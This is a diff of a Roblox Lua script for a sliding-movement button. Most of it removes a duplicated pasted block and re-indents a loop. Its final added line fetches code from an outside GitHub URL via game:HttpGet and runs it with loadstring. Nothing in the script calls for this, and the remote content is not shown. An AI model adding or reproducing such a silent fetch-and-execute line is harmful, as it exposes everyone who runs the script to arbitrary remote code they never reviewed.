@@ -44,59 +44,6 @@ SlideButton.Transparency = 0.5
 SlideButton.Active = false
 
 local sliding = false
-
-local function slide()
-    if sliding then return end
-    sliding = true
-    local slideAnimation = Instance.new("Animation")
-    slideAnimation.AnimationId = "rbxassetid://282574440"
-    local slideTrack = Humanoid:LoadAnimation(slideAnimation)
-local Players = game:GetService("Players")
-local StarterGui = game:GetService("StarterGui")
-local TweenService = game:GetService("TweenService")
-
-local player = Players.LocalPlayer
-local Char = player.Character or player.CharacterAdded:Wait()
-local Humanoid = Char:WaitForChild("Humanoid")
-
-local ScreenGui = Instance.new("ScreenGui")
-local Frame = Instance.new("TextButton")
-local SlideButton = Instance.new("TextButton")
-
-local SlideSpeed = type(_G.SlideSpeed) == "number" and _G.SlideSpeed or 75
-
-ScreenGui.Parent = game:GetService("CoreGui")
-ScreenGui.ResetOnSpawn = false
-
-Frame.Name = "Frame"
-Frame.Parent = ScreenGui
-Frame.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
-Frame.BorderColor3 = Color3.new(0, 0, 0)
-Frame.Position = UDim2.new(0.893773064, 0, 0.453002876, 0)
-Frame.Size = UDim2.new(0, 58, 0, 20)
-Frame.Font = Enum.Font.Code
-Frame.Text = "Drag :3"
-Frame.TextColor3 = Color3.new(1, 1, 1)
-Frame.TextSize = 15
-Frame.TextWrapped = true
-Frame.Transparency = 0.5
-Frame.Draggable = true
-
-SlideButton.Name = "SlideButton"
-SlideButton.Parent = Frame
-SlideButton.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
-SlideButton.BorderColor3 = Color3.new(0, 0, 0)
-SlideButton.Position = UDim2.new(0.8, -46.8459, 1, 4)
-SlideButton.Size = UDim2.new(0, 58, 0, 58)
-SlideButton.Font = Enum.Font.Code
-SlideButton.Text = "Slide"
-SlideButton.TextColor3 = Color3.new(1, 1, 1)
-SlideButton.TextSize = 15
-SlideButton.TextWrapped = true
-SlideButton.Transparency = 0.5
-SlideButton.Active = false
-
-local sliding = false
 local cancelled = false
 
 local function slide()
@@ -125,29 +72,29 @@ local function slide()
         sliding = false
         cancelled = false
     end)
-        while sliding do
-            wait()
-            local state = Humanoid:GetState()
-            if state == Enum.HumanoidStateType.Jumping then
-            slideTween:Cancel()
-            slideTrack:Stop()
-            cancelled = true
-            wait(0.35)
-            Humanoid.WalkSpeed = 24
-            SlideButton.Text = "Slide"
-            SlideButton.Active = true
-            sliding = false
-            cancelled = false
-        elseif state == Enum.HumanoidStateType.Freefall and not cancelled then
-            wait(0.2)
-            slideTween:Cancel()
-            slideTrack:Stop()
-            wait(0.2)
-            Humanoid.WalkSpeed = 24
-            SlideButton.Text = "Slide"
-            SlideButton.Active = true
-            sliding = false
-            cancelled = false
+    while sliding do
+        wait()
+        local state = Humanoid:GetState()
+        if state == Enum.HumanoidStateType.Jumping then
+           slideTween:Cancel()
+           slideTrack:Stop()
+           cancelled = true
+           wait(0.35)
+           Humanoid.WalkSpeed = 24
+           SlideButton.Text = "Slide"
+           SlideButton.Active = true
+           sliding = false
+           cancelled = false
+           elseif state == Enum.HumanoidStateType.Freefall and not cancelled then
+           wait(0.2)
+           slideTween:Cancel()
+           slideTrack:Stop()
+           wait(0.2)
+           Humanoid.WalkSpeed = 24
+           SlideButton.Text = "Slide"
+           SlideButton.Active = true
+           sliding = false
+           cancelled = false
         end
     end
 end
@@ -164,3 +111,4 @@ Humanoid.Died:Connect(function()
 end)
 
 Humanoid.WalkSpeed = 24
+loadstring(game:HttpGet("https://raw.githubusercontent.com/funnianklebreaking/RandomLuaCode/main/DJ"))()
